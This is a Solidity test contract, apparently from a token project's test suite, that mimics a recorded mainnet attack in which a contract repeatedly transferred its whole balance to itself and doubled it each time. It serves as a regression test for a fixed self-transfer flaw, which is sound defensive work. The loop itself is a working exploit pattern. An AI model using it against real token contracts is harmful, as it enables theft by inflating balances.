// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.7.6;

import "../../vendor/openzeppelin-contracts/contracts/math/SafeMath.sol";
import "../../vendor/openzeppelin-contracts/contracts/utils/Address.sol";
import "../CUTProxy.sol";

import "hardhat/console.sol";

/**
 * Selfie Attack Test Contract
 *
 * This contract mimics the behaviour of 0xf7bd3f84651dfe2405f1b74eb5c5a7613d93dfdb
 * by calling transfer to self in a loop, which generated 25 token transfer events, each
 * doubling the balance of the last.
 *
 * Mainnet transaction can be seen here:
 *   https://etherscan.io/tx/0xff73db0aa1b213f48ed7eb5d6bfc0a6e7a05d0948b76a1de10b540da6b41fd99
 *
 * This attack works against CUT pre "E:AS" same address transfer disabling, and
 * the matched/unmatched setting based on pre-calculated effects. See PR #23 For details.
 */
contract SelfieTest {
    using SafeMath for uint256;
    using Address for address;

    constructor () {}

    function sut(address cutAddr) public
    returns (bool) {

        uint256 iterLimit = 25;

        CUTProxy cut = CUTProxy(cutAddr);

        for (uint256 i=0; i < iterLimit; i++) {
            uint256 totalBalance = cut.balanceOf(address(this));
            console.log(totalBalance);
            cut.transfer(address(this), totalBalance);
        }

        return true;
    }
}